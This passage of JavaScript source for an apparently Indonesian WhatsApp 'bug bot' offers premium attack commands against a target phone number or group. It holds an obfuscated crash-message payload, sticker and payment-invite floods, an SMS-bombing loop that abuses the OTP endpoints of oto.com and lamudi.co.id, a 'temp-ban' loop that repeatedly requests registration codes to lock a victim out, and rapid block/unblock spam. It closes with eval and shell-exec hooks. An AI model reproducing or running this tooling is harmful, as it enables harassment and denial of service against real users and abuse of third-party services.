_0xbe5d7a={};_0xbe5d7a[_0x15a19b(0x4ce,0x506,0x501,0x4f9)]=_0x2427a7(0x339,0x339,0x366,0x389)+_0x15a19b(0x4da,0x4f4,0x4dc,0x4b4),_0xbe5d7a[_0x15a19b(0x4bc,0x49b,0x4aa,0x493)+_0x15a19b(0x51f,0x505,0x505,0x4c7)]=_0x15a19b(0x4f3,0x4c8,0x506,0x53d)+'\x22:\x22IDR\x22,\x22t'+'otal_amoun'+'t\x22:{\x22value'+_0x2427a7(0x33c,0x311,0x340,0x352)+',\x22offset\x22:'+_0x2427a7(0x331,0x302,0x329,0x2f8)+_0x15a19b(0x4d0,0x4dc,0x4e5,0x4be)+_0x15a19b(0x4e4,0x4ce,0x4b5,0x4de)+'KN\x22,\x22type\x22'+_0x15a19b(0x4cf,0x4ea,0x4de,0x4ff)+_0x15a19b(0x4fd,0x539,0x510,0x50a)+_0x2427a7(0x333,0x338,0x35b,0x347)+_0x2427a7(0x380,0x312,0x342,0x312)+_0x15a19b(0x4a9,0x476,0x4ab,0x4b1)+_0x2427a7(0x2ff,0x2fa,0x31a,0x353)+_0x15a19b(0x4c3,0x4b4,0x4e9,0x511)+_0x15a19b(0x504,0x4ba,0x4f1,0x52a)+_0x2427a7(0x326,0x33c,0x308,0x2db)+_0x15a19b(0x4fc,0x520,0x4f9,0x52e)+_0x2427a7(0x31e,0x334,0x315,0x2e1)+_0x2427a7(0x349,0x347,0x36d,0x35e)+_0x2427a7(0x34c,0x362,0x338,0x312)+_0x15a19b(0x48a,0x4d3,0x4ac,0x48d)+'id\x22:\x2275376'+_0x15a19b(0x535,0x4f5,0x50b,0x518)+_0x2427a7(0x348,0x2f8,0x318,0x30d)+'t_id\x22:\x22799'+_0x15a19b(0x510,0x500,0x4ea,0x4ff)+'009\x22,\x22name'+_0x2427a7(0x357,0x2de,0x319,0x2fa)+unic['n7']+(_0x2427a7(0x2ee,0x33f,0x31b,0x310)+_0x2427a7(0x33c,0x381,0x369,0x387)+_0x15a19b(0x4b6,0x48b,0x4c2,0x500)+_0x2427a7(0x364,0x358,0x370,0x3a0)+'},\x22quantit'+_0x15a19b(0x4d9,0x4d2,0x4ef,0x4c8)+_0x2427a7(0x335,0x390,0x36c,0x385)+':\x2278426746'+_0x2427a7(0x339,0x359,0x36e,0x350)+_0x15a19b(0x509,0x4bf,0x4e2,0x520)+_0x2427a7(0x2f8,0x303,0x2fb,0x307)+_0x15a19b(0x542,0x529,0x50d,0x4d9)+_0x15a19b(0x4b1,0x4fa,0x4d8,0x4be)+_0x2427a7(0x2df,0x322,0x30e,0x2ee)+_0x15a19b(0x4d5,0x4bb,0x4d7,0x4b5))+bug+(_0x2427a7(0x32b,0x308,0x31b,0x356)+_0x2427a7(0x357,0x3a5,0x369,0x37c)+_0x15a19b(0x49c,0x4e5,0x4c2,0x4af)+_0x2427a7(0x39d,0x354,0x370,0x37c)+_0x2427a7(0x30c,0x314,0x33b,0x374)+_0x15a19b(0x4ac,0x4b8,0x4c9,0x4a8)+'ative_paym'+_0x15a19b(0x49f,0x4ef,0x4b8,0x490)+_0x2427a7(0x2ff,0x351,0x31f,0x351));const _0x68c8f1={};_0x68c8f1['buttons']=[_0xbe5d7a];const _0x3439e0={};_0x3439e0['header']=_0x427c68,_0x3439e0[_0x2427a7(0x34b,0x312,0x341,0x33d)+'Message']=_0x68c8f1;const _0x22ac8a={};_0x22ac8a[_0x15a19b(0x48d,0x470,0x4a5,0x4d4)+_0x2427a7(0x345,0x34d,0x353,0x33b)]=_0x3439e0;const _0x19935d={};_0x19935d[_0x2427a7(0x33f,0x318,0x317,0x316)+'d']=!![],_0x19935d['forwardedN'+_0x2427a7(0x2ff,0x359,0x325,0x311)+_0x15a19b(0x48d,0x494,0x4bf,0x4af)]=_0x18e95c,_0x19935d[_0x15a19b(0x51e,0x515,0x4e0,0x50f)]=_0x2427a7(0x339,0x300,0x30f,0x346)+'FE4CDF',_0x19935d[_0x15a19b(0x506,0x4e3,0x4f8,0x52a)+'t']=_0x15a19b(0x4b2,0x48f,0x4ca,0x4b1)+_0x2427a7(0x36c,0x2f3,0x32f,0x2fe),_0x19935d[_0x2427a7(0x336,0x377,0x351,0x358)+_0x2427a7(0x34a,0x33e,0x328,0x35f)]=_0x22ac8a,_0x19935d[_0x2427a7(0x2f2,0x31b,0x30a,0x2d4)]=_0x15a19b(0x506,0x4dd,0x4f5,0x501)+_0x2427a7(0x312,0x32f,0x32d,0x333);const _0x48f80b={};_0x48f80b[_0x2427a7(0x2e4,0x2f7,0x31c,0x326)]=_0x2427a7(0x369,0x317,0x348,0x368),_0x48f80b[_0x2427a7(0x377,0x320,0x354,0x357)+'o']=_0x19935d;const _0x303aff={};_0x303aff[_0x2427a7(0x353,0x34e,0x34f,0x326)+_0x2427a7(0x333,0x31c,0x335,0x326)]=_0x48f80b,await joestar[_0x2427a7(0x379,0x359,0x356,0x385)+'ge'](target,_0x303aff,{});const _0x59a15e={};_0x59a15e[_0x2427a7(0x311,0x300,0x31c,0x2e2)]='';const _0x569645={};_0x569645[_0x15a19b(0x4bf,0x4a3,0x4c0,0x4e4)]=qbug,await joestar[_0x2427a7(0x2f3,0x333,0x2fa,0x311)+'e'](target,_0x59a15e,_0x569645);}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}✅. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'penghitaman': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 1962623836281@g.us`)
target = q
for (let i = 0; i < 30; i++) {
await joestar.sendVideoAsSticker(target, mengkece, qbug, { packname: unic.n2, author: unic.n3 })
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'vios': {
if (!isPremium) return msgreply(mess.premium)
if (!text) return msgreply(`Example: ${prefix + command} 6282823838978|1`);
target = q.split("|")[0]+"@s.whatsapp.net"
jumlah = q.split("|")[1] * 30
for (let i = 0; i < jumlah; i++) {
await joestar.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command} Dengan Jumlah ${jumlah}✅. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'spamsms': {
if (!isPremium) return msgreply(mess.premium)
if (!text) return msgreply(`Example: ${prefix + command} 62,878937388273|1`)
let matches = q.match(/62,(\d+)\|(\d+)/)
if (!matches) return msgreply('Invalid input format.')
let anjayy = matches[1]
let jumlah = matches[2]
for (let i = 0; i < jumlah; i++) {
await fetch("https://www.oto.com/ovb/send-otp?lang=id", {method:"POST",body:`mobile=${anjayy}&bookingId=0&businessUnit=mobil`,headers:{"Accept":"application/json, text/javascript, */*; q=0.01","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Cookie":"_CO_anonymousId=d895fba2-cb30-ff87-1d56-0ea0c035fb70; _CO_type=connecto; _CO_html5PermissionStatus=%7B%22status%22%3A%22default%22%2C%22time%22%3A%222024-03-15T01%3A59%3A00.683Z%22%7D; primary_utm_campaign=none; primary_utm_medium=none; primary_utm_source=Direct; utm_campaign=none; utm_medium=none; utm_source=Direct; landing_url=https%3A%2F%2Fwww.oto.com%2F; _csrf=tmqjNh8o6pPhEEu6QVfQ2ng94P302rS7; GCLB=CNXRvs7n0--CgAEQAw; _gcl_au=1.1.2014414873.1710467881; page_view=1; _ga_3Y81C1WC5H=GS1.1.1710467887.1.0.1710467887.60.0.0; _co_session_active=1; _ga=GA1.2.1213611959.1710467887; _gid=GA1.2.513695536.1710467892; _gat=1; _fbp=fb.1.1710467891782.2054515988; __gads=ID=7ce4179980a0d191:T=1710467892:RT=1710467892:S=ALNI_MbKgH0rH5dyUymZVGywKhIjRwS9JQ; __gpi=UID=00000d37d653843c:T=1710467892:RT=1710467892:S=ALNI_MbNaFl3wRcTl-p1nGYNM_vU1wbAfg; __eoi=ID=e0310b98b18ee544:T=1710467892:RT=1710467892:S=AA-Afjak-TLJzn0x4vHNkS4tST1f; _pbjs_userid_consent_data=3524755945110770; pbjs-pubCommonId=78d31f4c-ba42-4d0d-8dfb-7f382917cb71; _lr_retry_request=true; _lr_env_src_ats=false; pubmatic-unifiedid=%7B%22TDID%22%3A%221bcde2b6-9f8b-4538-badc-528178edb4ed%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222024-02-15T01%3A58%3A19%22%7D; _cc_id=18c3457dddcb22d6e2d494fe92ec9faf; panoramaId=87e01b4df01eb3d59f536106216216d53938fadec6ba2de73e2248d9332a655e; panoramaIdType=panoIndiv; cto_bidid=FP9l9F9XWmo1QmZ0T3dpZWMwTTBmTTk2M0J5RTNjamtPd0E1RW82Y1BNR3NYSHIlMkZheFJuR0JZNVdvemwlMkZ6WVBhNm9kdHFpd0dKSXdjNTVSZUw2TVpRektRaVp3NiUyRjBtYllQcHR6c0YzZFVyMUgxTSUzRA; cto_bundle=UTHX0V9YeDFBMTdZJTJCbXM0WmgxZGRiMW55UGk1RVk4Z2htSFc0MlZWM0RkYlo4QXVRVWhCS0pUWXVQcFJiMGp4S1VIQyUyQlByOGxBUkZKaTFQNmpOSHUwUUNUdW43Q1lQb1U5TnNlS2RRd2M2M1BEN1B0akFkU0Z6JTJCcjJSbjJSWDU1JTJGS2VlbldLb0JaSWxyWnJ5TXVJUmZUMDJ2dyUzRCUzRA; panoramaId_expiry=1711072699742; pbjs_debug=0; _browseet=eyJfdCI6MTcxMDQ2NzkwNjg0Mn0=; _browsee=eyJfaWQiOiJkMTkzNDA2NTkxN2YiLCJfdCI6MTcxMDQ2NzkwNjgzOSwiX3IiOjAsIl9wIjp7ImNvIjpmYWxzZSwiZXQiOnRydWUsInByIjpbXSwiaXQiOlsxXX19; FCNEC=%5B%5B%22AKsRol-3voJa04IkvGjjaVqQQvsefw7LA0NPHt44_uDItkJCREh8KisyNHLmYz940CSNQwc1_xHP-fqC21DpwqgQTk-OF9df_aKGFOu9eAcvwUlLQMiCeUQWUGmCCKP_8mmhYeUmF9mblbHRZJla6IIWXOZevMDBZQ%3D%3D%22%5D%5D;","Origin":"https://www.oto.com","Referer":"https://www.oto.com/ovb/user-login","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","User-Agent":randomUA,"X-Requested-With":"XMLHttpRequest"}}).then(res=>res.text()).then(msgreply);
await fetch("https://www.lamudi.co.id/check-mobile-number", { method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.lamudi.co.id", "Referer": "https://www.lamudi.co.id/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "User-Agent": randomUA }, body: JSON.stringify({ contactPhone: `+62${anjayy}`, formType: "register", mobileNumberLogin: true }) }).then(res=>res.text()).then(msgreply);
await sleep(23000)
}
}
break

case 'temp-ban': {
if (!isPremium) return msgreply(mess.prem)
if (!text) return msgreply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return msgreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await msgreply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'spamblock': {
if (!isCreator) return msgreply('*khusus Premium*')
await loading()
bnnd = text.split(",")[0]+'@s.whatsapp.net'
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await joestar.updateBlockStatus(bnnd, 'block')
await joestar.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
}
break

default:

if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)

function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

}
} catch (err) {
const errId = `${global.ownNumb}@s.whatsapp.net`
m.reply(require('util').format(err))
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}


let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})